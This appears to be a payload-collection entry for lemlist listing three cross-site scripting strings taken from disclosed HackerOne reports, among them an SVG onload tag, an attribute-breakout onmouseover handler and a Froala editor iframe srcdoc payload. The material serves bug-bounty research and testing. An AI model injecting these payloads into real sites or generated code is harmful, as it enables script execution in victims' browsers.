# lemlist

3 payloads.

### `bbb681ce`

```
/><svg src=x onload=confirm(document.domain);>
```

— [stored xss in target.com](https://hackerone.com/reports/919859) · lemlist · [omarelfarsaoui](https://hackerone.com/omarelfarsaoui)

### `6a47112e`

```
" onmouseover="confirm(document.domain)" a="
```

— [Stored XSS in target.com](https://hackerone.com/reports/928816) · lemlist · [solov9ev](https://hackerone.com/solov9ev)

### `b1c601e0`

```
<iframe srcdoc="<img src=x onerror=alert(document.domain)>"></iframe>
```

— [CVE-2019-19935 - DOM based XSS in the froala editor](https://hackerone.com/reports/938683) · lemlist · [chackal](https://hackerone.com/chackal)
